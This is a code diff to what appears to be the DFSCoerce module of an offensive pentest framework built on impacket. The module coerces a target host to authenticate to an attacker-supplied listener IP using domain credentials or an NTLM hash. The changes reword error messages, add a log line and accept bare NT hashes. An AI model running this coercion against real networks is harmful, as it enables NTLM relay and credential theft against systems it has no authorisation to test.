@@ -20,11 +20,11 @@ from impacket.uuid import uuidtup_to_bin
 
 class Module:
     name = 'DFSCoerce'
-    description = 'Generate an auth with DFSCoerce (Authentication required)'
+    description = 'Generate an authentication via DFSCoerce [authenticated]'
 
     def run(self, target, args, creds, timeout):
         if len(args) != 1:
-            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'DFSCoerce module requires 1 arg: -m dfscoerce <listener_ip>'})
+            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': '[%s] Requires 1 arg: -m dfscoerce <listener_ip>' % self.name})
             return
 
         domain = creds['domain'] if 'domain' in creds else None
@@ -36,8 +36,10 @@ class Module:
         listener_ip = args[0]
 
         if user == None:
-            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'DFSCoerce module requires valid credentials'})
+            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': '[%s] Requires valid credentials' % self.name})
             return
+
+        Output.minor({'target': 'smb://%s:%d' % (target['hostname'], 445), 'message': '[%s] Running module...' % self.name})
 
         check(target['hostname'], target['port'], listener_ip, domain, user, password, ntlm_hash, do_kerberos, dc_ip, timeout)
 
@@ -45,7 +47,11 @@ def check(ip, port, listener_ip, domain, username, password, ntlm_hash, do_kerbe
 
     pipe = 'lsarpc'
     if len(ntlm_hash) != 0:
-        lmhash, nthash = ntlm_hash.split(':')
+        if not ':' in ntlm_hash:
+            lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+            nthash = ntlm_hash.lower()
+        else:
+            lmhash, nthash = ntlm_hash.split(':')
     else:
         lmhash = ''
         nthash = ''
